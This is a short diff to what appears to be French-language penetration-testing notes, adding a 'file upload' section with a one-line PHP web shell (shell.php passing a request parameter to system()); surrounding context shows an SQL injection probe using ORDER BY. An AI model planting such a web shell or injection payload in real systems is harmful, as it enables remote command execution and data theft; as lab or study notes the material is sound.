@@ -404,3 +404,14 @@ SELECT * FROM users WHERE name='harry' ORDER BY 8;-- '
 +---------+-------+---------------------+---------------
 
 ```
+
+## Upload de fichier
+
+Fichier shell.php: 
+
+```php
+<?php
+    system($_REQUEST['cmd']);
+?>
+```
+
